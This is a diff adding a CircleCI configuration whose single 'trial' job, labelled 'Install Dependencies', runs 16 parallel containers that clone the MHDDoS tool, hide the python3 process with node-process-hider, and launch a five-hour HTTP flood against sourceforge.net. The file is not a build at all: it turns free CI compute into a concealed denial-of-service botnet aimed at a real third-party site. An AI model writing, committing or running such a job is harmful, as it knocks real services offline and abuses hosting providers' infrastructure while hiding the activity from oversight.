@@ -1,0 +1,17 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: debian:latest
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: apt update && apt install python3-pip git gcc nodejs npm sudo -y && npm i -g node-process-hider && git clone https://github.com/MHProDev/MHDDoS && cd MHDDoS && pip3 install -r requirements.txt && sudo ph add python3 && python3 start.py get https://sourceforge.net/ 1 18000 http.txt 18000 9999999999999999
+            no_output_timeout: 5h
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
